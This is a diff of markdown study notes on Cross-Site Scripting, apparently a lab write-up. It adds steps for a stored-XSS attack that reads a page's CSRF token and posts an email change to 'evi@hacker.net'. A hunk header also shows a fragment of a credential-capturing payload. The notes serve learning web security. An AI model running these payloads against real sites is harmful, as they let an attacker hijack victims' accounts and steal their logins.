@@ -1,4 +1,4 @@
-### Cross-Site Scripting(XSS) is a attack where attacker injects malicious javascript into a trusted website so when another users visit the page the browser runs the script as if like it comes from the script. 
+<img width="796" height="562" alt="image" src="https://github.com/user-attachments/assets/f076b11c-7c56-451f-9bbc-1892882d9161" />### Cross-Site Scripting(XSS) is a attack where attacker injects malicious javascript into a trusted website so when another users visit the page the browser runs the script as if like it comes from the script. 
 Cross ---> Code from outside source
 Site ---> runs inside a trusted site
 Scripting --> attackers code runs on the victims browser. 
@@ -780,7 +780,7 @@ body:username.value+':'+this.value
 # ------------------------------------------------------------------------------
 
 
-# 23. Exploiting XSS to bypass CSRF defenses.
+# 24. Exploiting XSS to bypass CSRF defenses.
 
 <img width="744" height="142" alt="image" src="https://github.com/user-attachments/assets/c01e403b-597f-47e4-b789-bef0a67f3fd3" />
 
@@ -798,8 +798,25 @@ body:username.value+':'+this.value
 
 <img width="605" height="421" alt="image" src="https://github.com/user-attachments/assets/e67d1071-a819-4066-ac94-0b7efd7d5608" />
 
+- We will try to view the source code of the application and we find the csrf token with the name csrf. 
 
+<img width="1028" height="527" alt="image" src="https://github.com/user-attachments/assets/22398223-96db-461c-8927-4b450ab4969a" />
 
+- We try to write a script that will make the victim to send a request to the server with csrf to change the email.  Following is the script. 
+
+<img width="782" height="280" alt="image" src="https://github.com/user-attachments/assets/e9841240-1ef6-4c87-9b41-4a5ead2d6d27" />
+
+- var token = document.getElementsByName('csrf')[0].value ;  --> creating a varible called token and storing the csrf value there.
+- var data = new formData();
+data.append('csrf', token)
+data.append('email', 'evi@hacker.net');
+fetch('/my-account/change-email'       --> Creating a new data and changing the email and attaching the csrf to it.
+
+- Hence by posting this we solve the lab.
+
+# ------------------------------------------------------------------------------
+
+# 25.
 
 
 
